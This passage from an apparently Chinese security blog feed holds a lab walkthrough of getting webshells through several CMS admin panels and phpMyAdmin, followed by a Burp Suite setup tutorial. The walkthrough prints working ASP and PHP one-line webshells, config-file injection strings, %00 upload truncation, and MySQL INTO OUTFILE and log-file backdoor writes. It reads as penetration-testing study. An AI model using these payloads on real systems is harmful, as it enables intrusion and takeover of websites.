punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cacheFile</span> <span class="token operator">=</span> <span class="token constant">DEDEDATA</span><span class="token operator">.</span><span class="token string single-quoted-string">'/cache/myad-'</span><span class="token operator">.</span><span class="token variable">$aid</span><span class="token operator">.</span><span class="token string single-quoted-string">'.htm'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$nocache</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$cacheFile</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$cacheFile</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token variable">$cfg_puccache_time</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$dsql</span><span class="token operator">-&gt;</span><span class="token function">GetOne</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT * FROM `#@__myad` WHERE aid='<span class="token interpolation"><span class="token variable">$aid</span></span>' "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'timeset'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'normbody'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token variable">$ntime</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ntime</span> <span class="token operator">&gt;</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'endtime'</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token variable">$ntime</span> <span class="token operator">&lt;</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'starttime'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expbody'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'normbody'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\"'</span><span class="token punctuation">,</span><span class="token variable">$adbody</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\\r"</span><span class="token punctuation">,</span><span class="token variable">$adbody</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\\n"</span><span class="token punctuation">,</span><span class="token variable">$adbody</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;!--\r\ndocument.write(\"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$adbody</span><span class="token punctuation">}</span></span>\");\r\n--&gt;\r\n"</span><span class="token punctuation">;</span>    <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$cacheFile</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$adbody</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">include</span> <span class="token variable">$cacheFile</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先获取广告aid，若为0返回 request error；</p><p>然后从数据中获取内容拿到catch file 文件里，然后包含进来，这会导致命令执行</p><p>所以我们可以写入一句话getshell</p><h3 id="aspcms后台-getshell"><a href="#aspcms后台-getshell" class="headerlink" title="aspcms后台 getshell"></a>aspcms后台 getshell</h3><p>我们首先进入后台，路径如下</p><pre class="line-numbers language-none"><code class="language-none">www.cbi3.com/admin_aspcms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>admin 123456进入后台</p><p><img src="/2021/12/04/day35/image-20211205134706714.png" alt="image-20211205134706714"></p><h4 id="修改配置文件getshell"><a href="#修改配置文件getshell" class="headerlink" title="修改配置文件getshell"></a>修改配置文件getshell</h4><p>在后台里，如果可以修改网站配置文件，且没有做过滤，则我们可以写入准备好的语句getshell。</p><p>这里需要注意闭合的问题，因为配置文件在网站中是全局调用，出错的话网站无法访问。</p><p>字符类型闭合和数字闭合依次如下：</p><p>字符型用双引号闭合</p><pre class="line-numbers language-none"><code class="language-none">"%&gt;&lt;%eval request(chr(35))%&gt;&lt;% %&gt;&lt;%eval request(chr(35))%&gt;&lt;%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来我们找没有被过滤的地方</p><p><img src="/2021/12/04/day35/image-20211205141435233.png" alt="image-20211205141435233"></p><p>修改后再config配置文件中查看</p><p><img src="/2021/12/04/day35/image-20211205141538658.png" alt="image-20211205141538658"></p><p>此处不行</p><p>我们又发现了类似于之前的模板修改</p><p><img src="/2021/12/04/day35/image-20211205141716293.png" alt="image-20211205141716293"></p><p>但是后缀为html，我们需要修改后缀，这里需要让后缀为asp，抓包试下</p><p><img src="/2021/12/04/day35/image-20211205141905992.png" alt="image-20211205141905992"></p><p>改为asp后发现出错，这里也不行</p><p><img src="/2021/12/04/day35/image-20211205141942901.png" alt="image-20211205141942901"></p><p>接着我们再扩展功能-幻灯片设置这里，发现这里也是对配置文件进行修改</p><p><img src="/2021/12/04/day35/image-20211205142310658.png" alt="image-20211205142310658"></p><p>接着我们需要找的是没被过滤的地方，尝试后说明文字加双引号也被过滤</p><p>所以我们尝试数字这里，抓包</p><p><img src="/2021/12/04/day35/image-20211205142535447.png" alt="image-20211205142535447"></p><p>我们再这里尝试1后加一句话</p><pre class="line-numbers language-none"><code class="language-none">%&gt;&lt;%eval request(chr(35))%&gt;&lt;%<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一句话做url编码</p><p><img src="/2021/12/04/day35/image-20211205142955556.png" alt="image-20211205142955556"></p><p>最后如下</p><pre class="line-numbers language-none"><code class="language-none">slidestyle=1%25&gt;&lt;%25eval+request(chr(35))%25&gt;&lt;%25<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们查看靶机的配置文件</p><p><img src="/2021/12/04/day35/image-20211205143129585.png" alt="image-20211205143129585"></p><p><img src="/2021/12/04/day35/image-20211205143351022.png" alt="image-20211205143351022"></p><p>连接地址</p><pre class="line-numbers language-none"><code class="language-none">http://www.cbi3.com/config/AspCms_Config.asp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功拿到了webshell</p><p><img src="/2021/12/04/day35/image-20211205143409093.png" alt="image-20211205143409093"></p><h3 id="南方数据企业系统getshell"><a href="#南方数据企业系统getshell" class="headerlink" title="南方数据企业系统getshell"></a>南方数据企业系统getshell</h3><p>先进入后台，</p><pre class="line-numbers language-none"><code class="language-none">http://www.cbi7.com/admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/04/day35/image-20211205143627058.png" alt="image-20211205143627058"></p><p>admin 123456进入</p><p><img src="/2021/12/04/day35/image-20211205143650958.png" alt="image-20211205143650958"></p><h4 id="上传截断getshell"><a href="#上传截断getshell" class="headerlink" title="上传截断getshell"></a>上传截断getshell</h4><p>这里找是否能直接上传脚本文件</p><p><img src="/2021/12/04/day35/image-20211205144348110.png" alt="image-20211205144348110"></p><p>看到这里有个上传点</p><p>直接上传asp脚本文件</p><p><img src="/2021/12/04/day35/image-20211205144718721.png" alt="image-20211205144718721"></p><p>防止体量太小前面加点字符</p><p>一句话</p><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;%eval request("123")%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接上传asp文件发现不允许上传</p><p><img src="/2021/12/04/day35/image-20211205144836780.png" alt="image-20211205144836780"></p><p>但是我们在这里发现，上传时可以选择目录路径，猜测它上传时放到目录下，我们这里想必可以使用%00截断来上传asp文件</p><p><img src="/2021/12/04/day35/image-20211205144916360.png" alt="image-20211205144916360"></p><p>首先修改文件名称</p><p><img src="/2021/12/04/day35/image-20211205145124183.png" alt="image-20211205145124183"></p><p>然后修改目录路径做%00截断，截断后仍作为asp格式上传上去</p><p><img src="/2021/12/04/day35/image-20211205145311787.png" alt="image-20211205145311787"></p><p>做了url decode后</p><p><img src="/2021/12/04/day35/image-20211205145338867.png" alt="image-20211205145338867"></p><p>可以看到成功上传了</p><p><img src="/2021/12/04/day35/image-20211205145417792.png" alt="image-20211205145417792"></p><p>上传路径也显示出来了</p><pre class="line-numbers language-none"><code class="language-none">http://www.cbi7.com/Upload/PicFiles/2.asp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到了webshell</p><p><img src="/2021/12/04/day35/image-20211205145648721.png" alt="image-20211205145648721"></p><h4 id="修改配置文件getshell-1"><a href="#修改配置文件getshell-1" class="headerlink" title="修改配置文件getshell"></a>修改配置文件getshell</h4><p>这里我们也在找找这种方法getshell</p><p>我们在系统管理-网站信息设置里</p><p><img src="/2021/12/04/day35/image-20211205151555992.png" alt="image-20211205151555992"></p><p>发现单引号不会出错，双引号内部服务器出错</p><p>但是这里我们需要用双引号闭合</p><p><img src="/2021/12/04/day35/image-20211205151851951.png" alt="image-20211205151851951"></p><p>我们构造一句话</p><pre class="line-numbers language-none"><code class="language-none">"%&gt;&lt;%eval request(chr(35))%&gt;&lt;%s="<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>“闭合前面的”</p><p>%&gt;闭合前面的&lt;%</p><p>中间写入asp一句话</p><p>&lt;%闭合后面的%&gt;</p><p>s=”闭合后面的”</p><p><img src="/2021/12/04/day35/image-20211205153113289.png" alt="image-20211205153113289"></p><p>虽然双引号闭合报内部服务器错误，但是我们用蚁剑连接发现可以连接</p><p>连接路径</p><pre class="line-numbers language-none"><code class="language-none">www.cbi7.com/Inc/Const.asp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到webshell</p><p><img src="/2021/12/04/day35/image-20211205153435344.png" alt="image-20211205153435344"></p><p>我们在系统管理-常量设置，找到了系统的配置文件修改，这里显然也可插入一句话</p><pre class="line-numbers language-none"><code class="language-none">&lt;%eval request(chr(35))%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/04/day35/image-20211205153733141.png" alt="image-20211205153733141"></p><p>直接再最后加入一句话</p><p>因为修改的是同一个常量文件，所以还是上面的路径</p><p>连接拿到了webshell</p><p><img src="/2021/12/04/day35/image-20211205153856792.png" alt="image-20211205153856792"></p><h3 id="phpmyadmin-getshell"><a href="#phpmyadmin-getshell" class="headerlink" title="phpmyadmin getshell"></a>phpmyadmin getshell</h3><p>我们打开phpstudy，安装phpmyadmin，登录phpmyadmin</p><h4 id="执行sql命令-getshell"><a href="#执行sql命令-getshell" class="headerlink" title="执行sql命令 getshell"></a>执行sql命令 getshell</h4><p>登录phpmyadmin后，我们可以使用into outfile写入后门</p><pre class="line-numbers language-none"><code class="language-none">select '&lt;?php phpinfo();eval($_POST[123]);?&gt;' into outfile 'D:/phpstudy_pro/WWW/www.k123.com/x.php'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>必须写入网站目录下，一句话后门才能被解析</p><p><img src="/2021/12/04/day35/image-20211206140346154.png" alt="image-20211206140346154"></p><p>命令无法执行因为在安装MySQL的时候限制了导入与导出的目录权限。只允许在规定的目录下才能导入，需要修改mysql配置文件</p><p>我们可以去掉导入的目录限制，再mysql配置文件中加入</p><pre class="line-numbers language-none"><code class="language-none">secure_file_priv =<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/04/day35/image-20211206141119198.png" alt="image-20211206141119198"></p><p>修改后重启mysql命令即可执行</p><p><img src="/2021/12/04/day35/image-20211206141157093.png" alt="image-20211206141157093"></p><p>可以再网站根目录下看到确实写入了</p><p><img src="/2021/12/04/day35/image-20211206141253499.png" alt="image-20211206141253499"></p><p><img src="/2021/12/04/day35/image-20211206141310856.png" alt="image-20211206141310856"></p><p>成功getshell</p><p><img src="/2021/12/04/day35/image-20211206141345792.png" alt="image-20211206141345792"></p><h4 id="mysql日志文件getshell"><a href="#mysql日志文件getshell" class="headerlink" title="mysql日志文件getshell"></a>mysql日志文件getshell</h4><p>我们利用mysql的日志文件写入shell，这个日志文件可以通过phpmyadmin，修改他的存放位置和后缀</p><p>首先我们再phpmyadmin中开启日志记录</p><pre class="line-numbers language-none"><code class="language-none">SET global general_log = "ON";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/04/day35/image-20211206143401203.png" alt="image-20211206143401203"></p><p>我们可以在常量处查看是否修改</p><p><img src="/2021/12/04/day35/image-20211206143527364.png" alt="image-20211206143527364"></p><p>然后我们给日志一个保存路径，并且附加后缀</p><p>保存好原有路径，测试完后改回去</p><pre class="line-numbers language-none"><code class="language-none">D:\phpstudy_pro\Extensions\MySQL5.7.26\data\WIN-GB0DQ04MBCM.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">SET global general_log_file ='D:/phpstudy_pro/WWW/www.k123.com/a.php';<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/04/day35/image-20211206143613853.png" alt="image-20211206143613853"></p><p>然后我们搜索一句话会被日志记录下来</p><pre class="line-numbers language-none"><code class="language-none">select '&lt;?php phpinfo();eval($_POST[123]);?&gt;'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/04/day35/image-20211206143630319.png" alt="image-20211206143630319"></p><p><img src="/2021/12/04/day35/image-20211206143702026.png" alt="image-20211206143702026"></p><p>可以看到日志记录在了网站目录下，并且我们查询的一句话被记录下了</p><p>此时我们的一句话后门就会被解析</p><p><img src="/2021/12/04/day35/image-20211206143756850.png" alt="image-20211206143756850"></p><p>并且成功getshell</p><p><img src="/2021/12/04/day35/image-20211206143826077.png" alt="image-20211206143826077"></p><h3 id="pageadmin-getshell"><a href="#pageadmin-getshell" class="headerlink" title="pageadmin getshell"></a>pageadmin getshell</h3><p>还是先登录后台管理，</p><pre class="line-numbers language-none"><code class="language-none">www.cbi9.com/admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/04/day35/image-20211206144711456.png" alt="image-20211206144711456"></p><p>admin 123456进入</p><p><img src="/2021/12/04/day35/image-20211206144735476.png" alt="image-20211206144735476"></p><h4 id="上传模块getshell"><a href="#上传模块getshell" class="headerlink" title="上传模块getshell"></a>上传模块getshell</h4><p>进入后台后，我们首先在工具-文件管理处寻找，</p><p><img src="/2021/12/04/day35/image-20211206145259379.png" alt="image-20211206145259379"></p><p>这里我们发现可以改名，我们尝试后发现不能修改为php、asp等的后缀名，做了限制</p><p>然后我们在功能中发现了上传文件</p><p><img src="/2021/12/04/day35/image-20211206145410768.png" alt="image-20211206145410768"></p><p>经尝试发现不能上传php、asp后缀文件</p><p>功能中还有个模板安装，允许上传zip格式文件</p><p><img src="/2021/12/04/day35/image-20211206145538460.png" alt="image-20211206145538460"></p><p>我们这里尝试把一句话压缩为zip格式上传</p><p><img src="/2021/12/04/day35/image-20211206145837611.png" alt="image-20211206145837611"></p><p>发现可以上传</p><p>安装后我们在Templates/1 中找到了我们上传的模板</p><p><img src="/2021/12/04/day35/image-20211206150020825.png" alt="image-20211206150020825"></p><p>路径</p><pre class="line-numbers language-none"><code class="language-none">www.cbi9.com/Templates/1/1.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功getshell</p><p><img src="/2021/12/04/day35/image-20211206150217309.png" alt="image-20211206150217309"></p><p>到这里我们发现一个事，既然zip上传可行，我们刚才的文件上传是不是也可以上传zip格式</p><p><img src="/2021/12/04/day35/image-20211206151647010.png" alt="image-20211206151647010"></p><p>尝试之后发现上传上去了，我们把它解压即可getshell，就不演示了</p><h4 id="利用配置文件中的数据库连接信息getshell"><a href="#利用配置文件中的数据库连接信息getshell" class="headerlink" title="利用配置文件中的数据库连接信息getshell"></a>利用配置文件中的数据库连接信息getshell</h4><p>我们在文件管理中发现了后缀为config的配置文件</p><p><img src="/2021/12/04/day35/image-20211206152126179.png" alt="image-20211206152126179"></p><p>查看后我们发现了数据库的连接信息</p><p><img src="/2021/12/04/day35/image-20211206152209725.png" alt="image-20211206152209725"></p><p>我们用数据库客户端连接它</p><p>user id为SA应该是个SQL server数据库</p><p><img src="/2021/12/04/day35/image-20211206152644413.png" alt="image-20211206152644413"></p><p><img src="/2021/12/04/day35/image-20211206152735065.png" alt="image-20211206152735065"></p><p>成功getshell</p><p><img src="/2021/12/04/day35/image-20211206152803532.png" alt="image-20211206152803532"></p><h3 id="无忧企业系统-getshell"><a href="#无忧企业系统-getshell" class="headerlink" title="无忧企业系统 getshell"></a>无忧企业系统 getshell</h3><p>还是先找后台管理进入</p><pre class="line-numbers language-none"><code class="language-none">www.cbi18.com/admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/04/day35/image-20211206162717194.png" alt="image-20211206162717194"></p><p>admin 123456进入</p><p><img src="/2021/12/04/day35/image-20211206162737260.png" alt="image-20211206162737260"></p><h4 id="上传文件getshell"><a href="#上传文件getshell" class="headerlink" title="上传文件getshell"></a>上传文件getshell</h4><p>进入后台后我们发现上传点</p><p><img src="/2021/12/04/day35/image-20211206163843622.png" alt="image-20211206163843622"></p><p>但是发现asp、php等的后缀无法上传</p><p><img src="/2021/12/04/day35/image-20211206163912432.png" alt="image-20211206163912432"></p><p>看到只允许xxx的，显然做了一个白名单，而且我们在网站设置处发现了这个白名单设置</p><p><img src="/2021/12/04/day35/image-20211206164017460.png" alt="image-20211206164017460"></p><p>那我们只需要把我们想要上传的后缀加上去上传即可，就不演示了</p><h4 id="留言一句话到数据库getshell"><a href="#留言一句话到数据库getshell" class="headerlink" title="留言一句话到数据库getshell"></a>留言一句话到数据库getshell</h4><p>如果access数据库是asp格式，我们可以插入一句话到数据库，访问数据库即可getshell</p><p><img src="/2021/12/04/day35/image-20211206164209421.png" alt="image-20211206164209421"></p><p>我们通过留言来写入一句话</p><p><img src="/2021/12/04/day35/image-20211206164515043.png" alt="image-20211206164515043"></p><p>在网站前台留言，然后再后台回复一句话</p><pre class="line-numbers language-none"><code class="language-none">┼攠數畣整爠煥敵瑳∨≡┩愾 密码a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/04/day35/image-20211206164636158.png" alt="image-20211206164636158"></p><p>这样我们的一句话就插入到数据库里</p><p>我们可以直接通过数据库路径访问</p><p><img src="/2021/12/04/day35/image-20211206164803721.png" alt="image-20211206164803721"></p><p>asp文件名字需要url编码</p><p><img src="/2021/12/04/day35/image-20211206164836249.png" alt="image-20211206164836249"></p><p>500错误证明我们的一句话写入了</p><pre class="line-numbers language-none"><code class="language-none">http://www.cbi18.com/Databases/%25%23%40%24%40%23%46%44%53%40%23%24%25%25%23.asp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功getshell</p><p><img src="/2021/12/04/day35/image-20211206164910522.png" alt="image-20211206164910522"></p><p>我们也可以将数据库备份为asp文件，然后通过备份的路径访问webshell</p><p><img src="/2021/12/04/day35/image-20211206165007766.png" alt="image-20211206165007766"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网站后台getshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burp详解</title>
      <link href="/2021/11/15/day34/"/>
      <url>/2021/11/15/day34/</url>
      
        <content type="html"><![CDATA[<h1 id="burpsuite的使用"><a href="#burpsuite的使用" class="headerlink" title="burpsuite的使用"></a>burpsuite的使用</h1><p>系统的放点东西，借鉴为主，供参考。</p><span id="more"></span><h2 id="SSL和proxy高级选项"><a href="#SSL和proxy高级选项" class="headerlink" title="SSL和proxy高级选项"></a>SSL和proxy高级选项</h2><p>HTTPS协议是为了数据传输安全的需要，在HTTP原有的基础上，加入了安全套接字层SSL协议，通过CA证书来验证服务器的身份，并对通信消息进行加密。</p><p>基于HTTPS协议这些特性， 我们在使用Burp Proxy代理时，需要增加更多的设置，才能拦截HTTPS的消息。（安装ca证书）</p><h3 id="proxy监听设置"><a href="#proxy监听设置" class="headerlink" title="proxy监听设置"></a>proxy监听设置</h3><p>当我们启动Burp Suite时，默认会监听本地回路地址的8080端口，除此之外，我们也可以在默认监听的基础上，根据我们自己的需求，对监听端口和地址等参数进行自由设置。</p><p>特别是当 我们测试非浏览器应用时，无法使用浏览器代理的方式去拦截客户端与服务器端通信的数据 流量，这种情况下，我们会使用自己的Proxy监听设置，而不会使用默认设置。</p><p><img src="/2021/11/15/day34/image-20211115171138095.png" alt="image-20211115171138095"></p><p>当我们在实际使用中，可能需要同时测试不同的应用程序时，我们可以通过设置不同的代理、端口，来区分不同的应用程序，Proxy监听即提供这样的功能设置。</p><p>点击图中的【Add】按 钮，会弹出Proxy监听设置对话框，里面有更丰富的设置，满足我们不同的测试需求。</p><p><img src="/2021/11/15/day34/image-20211115171252052.png" alt="image-20211115171252052"></p><p>Proxy监听设置主要包含3块功能： </p><ol><li><p>端口和IP绑定设置Binding 绑定的端口port是指Burp Proxy代理服务监听的端口，绑定IP 地址分仅本地回路、所有接口、指定地址三种模式，在渗透测试中，无论你选择哪种模 式，你需要明白一点，<strong>当你选择的非本地回路IP地址时，同局域网内的其他电脑也可以 访问你的监听地址</strong>。 </p></li><li><p>请求处理Request Handling 请求处理主要是用来控制接受到Burp Proxy监听端口的请求 后，如果对请求进行处理的。</p><p><img src="/2021/11/15/day34/image-20211115172100204.png" alt="image-20211115172100204"></p><p>其具体配置可分为：端口的转发、主机名/域名的转发、强制使用SSL和隐形代理4个部 分。</p><p>当我们配置了端口的转发时，所有的请求都会被转发到这个端口上；如果我们配置 了主机或域名的转发，则所有的请求会转发到指定的主机或域名上。</p><p>同时，我们可以指定，通过Burp Proxy的消息是否强制使用SSL，如果设置了此项，则请求若是http协议， 经Burp proxy代理后将转换为https协议。</p><p>隐形代理主要是用于测试富客户端应用或者是非浏览器代理方式的应用，当我们设置了它,访问这些应用时，将通过非代理的方式，直接连接Burp Proxy的监听端口。</p></li><li><p>SSL 证书 这些设置控制呈现给SSL客户端的服务器SSL证书。可以解决使用拦截代理时 出现的一些SSL问题： </p><p>1.您可以消除您的浏览器的SSL警报，并需要建立SSL例外。其 中，网页加载来自其他域的SSL保护的项目，可以确保这些正确的加载到浏览器，而不需 要为每个域手动接受代理的SSL证书。 </p><p>2.可以与该拒绝无效的SSL证书连接到服务器胖客 户机应用程序的工作。 </p><p>它有下列选项可供设置： </p><ol start="4"><li><p>使用自签名证书（Use a self-signed certificate ） —— 一个简单的自签名SSL证书呈现 给您的浏览器，它总是会导致SSL警告。 </p></li><li><p>生成每个主机的CA签名证书（Generate CA-signed per-host certificates）—— 这是默认 选项。在安装时，Burp创造了一个独特的自签名的证书颁发机构（CA）证书，并将此计 算机上使用。当你的浏览器发出的SSL连接指定主机，Burp生成该主机的SSL证书，由 CA证书签名。您可以安装Burp的CA证书作为浏览器中的受信任的根，从而使每个主机证 书没有任何警报接受。 </p></li><li><p>生成与特定的主机名CA签发的证书（Generate a CA-signed certificate with a specific hostname）—— -是类似于前面的选项;不同的是，Burp会生成一个主机证书与每一个 SSL连接使用，使用指定的主机名。 </p></li><li><p>使用自定义证书（Use a custom certificate）—— 此选项可以加载一个特定的证书（在 PKCS＃12格式）呈现给浏览器。如果应用程序使用这需要一个特定的服务器证书（例 如，与给定的序列号或证书链）的客户端应该使用这个选项。 </p></li></ol></li></ol><h3 id="SSL直连和隐形代理"><a href="#SSL直连和隐形代理" class="headerlink" title="SSL直连和隐形代理"></a>SSL直连和隐形代理</h3><p>SSL直连的设置主要用于指定的目的服务器直接通过SSL连接，而通过这些连接的请求或响应，任何细节将在Burp代理拦截视图或历史日志中可见。</p><p>通过SSL连接传递可以并不是简单地消 除在客户机上SSL错误的情况下有用。比如说，在执行SSL证书的移动应用。如果应用程序访问多个域，或使用HTTP和HTTPS连接的混合，然后通过SSL连接到特定的主机问题，仍然使您 能够以正常的方式使用Burp的其他方式进行通信。如果启用自动添加客户端SSL协商失败的选项，当客户端失败的SSL协议检测（例如，由于不承认Burp的CA证书），并会自动将相关 的服务器添加到SSL直通通过列表中去。其设置界面如下图所示： </p><p><img src="/2021/11/15/day34/image-20211115190736800.png" alt="image-20211115190736800"></p><p>有时候，在拦截富客户端软件时，我们通常需要使用隐形代理。富客户端软件通常是指运行 在浏览器之外的客户端软件，这就意味着它本身不具有HTTP代理是属性。当它进行网络通信 时，客户端将无法使代理感知或者无法由代理进行通信。在Burp中，我们可以使用隐形代理 的方式，对通信内容进行代理或拦截，从而对通信的请求和响应消息进行分析。使用隐形代 </p><p>理通常需要做如下设置（以<a href="https://example.com为例）：">https://example.com为例）：</a> </p><ol><li><p>配置hosts文件，Windows操作系 统下的目录位置Windows/System32/drivers/etc/hosts，而Linux或者Unix下的目录 为/etc/hosts，添加如下行：</p><pre class="line-numbers language-none"><code class="language-none">127.0.0.1 example.com <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>第一步设置完成之后，我们需要添加一个新的监听来运行在HTTP默认的80端口，如果通信 流量使用HTTPS协议，则端口为443。 </p><p><img src="/2021/11/15/day34/image-20211115190955222.png" alt="image-20211115190955222"></p></li><li><p>如果是HTTPS协议的通信方式，我们需要一个指定域名的CA证书。 <img src="/2021/11/15/day34/image-20211115191010173.png" alt="image-20211115191010173"></p></li><li><p>接着，我们需要把Burp拦截的流量转发给原始请求的服务器。这需要在Options- Connections-&gt;Hostname Resolution 进行设置。因为我们已经告诉了操作系统， example.com的监听地址在127.0.0.1上，所以我们必须告诉Burp，将example.com的流量转 发到真实的服务器那里去。 </p><p><img src="/2021/11/15/day34/image-20211115191046827.png" alt="image-20211115191046827"></p></li></ol><p>通过这样的配置，我们就可以欺骗富客户端软件，将流量发送到Burp监听的端口上，再由 Burp将流量转发给真实的服务器。 </p><h2 id="如何使用burp-target"><a href="#如何使用burp-target" class="headerlink" title="如何使用burp target"></a>如何使用burp target</h2><p>Burp Target 组件主要包含站点地图、目标域、Target 工具三部分组成，他们帮助渗透测试人 员更好地了解目标应用的整体状况、当前的工作涉及哪些目标域、分析可能存在的攻击面等 信息。 </p><h3 id="目标域设置-target-score"><a href="#目标域设置-target-score" class="headerlink" title="目标域设置 target score"></a>目标域设置 target score</h3><p>Target Scope中作用域的定义比较宽泛，通常来说，当我们对某个产品进行渗透测试时，可以 通过域名或者主机名去限制拦截内容，这里域名或主机名就是我们说的作用域；如果我们想 限制得更为细粒度化，比如，你只想拦截login目录下的所有请求，这时我们也可以在此设 置，此时，作用域就是目录。总体来说，Target Scope主要使用于下面几种场景中： </p><ul><li>限制站点地图和Proxy 历史中的显示结果 </li><li>告诉Burp Proxy 拦截哪些请求 </li><li>Burp Spider抓取哪些内容 </li><li>Burp Scanner自动扫描哪些作用域的安全漏洞 </li><li>在Burp Intruder和Burp Repeater 中指定URL </li></ul><p>通过Target Scope 我们能方便地控制Burp 的拦截范围、操作对象，减少无效的噪音。在 Target Scope的设置中，主要包含两部分功能：允许规则和去除规则。 </p><p><img src="/2021/11/15/day34/image-20211115191942118.png" alt="image-20211115191942118"></p><p>其中允许规则顾名思义，即包含在此规则列表中的，视为操作允许、有效。如果此规则用于 